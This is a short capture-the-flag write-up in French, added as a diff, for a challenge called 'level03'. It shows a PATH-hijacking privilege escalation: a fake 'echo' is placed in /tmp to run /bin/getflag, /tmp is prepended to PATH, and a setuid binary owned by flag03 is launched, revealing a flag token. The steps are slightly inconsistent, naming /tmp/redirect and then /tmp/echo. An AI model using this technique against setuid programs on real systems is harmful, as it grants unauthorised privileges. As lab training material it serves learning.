@@ -1,0 +1,15 @@
+`echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03`
+
+On remarque l'executable "level03" présent a la racine, l'exécuter nous écrit "exploit me".
+
+En regardant un peu dans l'exécutable on remarque la ligne "/usr/bin/env echo Exploit me".
+
+Après un "find . -user flag03" on remarque que l'executable appartient a flag03, qui est l'utilisateur recherché.
+
+Il suffit donc de rediriger la commande "echo" vers la commande "getflag" qui sera alors lancé par l'utilisateur flag03.
+
+touch /tmp/redirect
+vim /tmp/redirect -> écrire /bin/getflag
+chmod 777 /tmp/echo -> on donne les droit a flag03 d'utiliser notre fichier
+export PATH=/tmp:$PATH
+./level03 -> l'executable fait un getflag, ce qui nous donne: qi0maab88jeaj46qoumi7maus
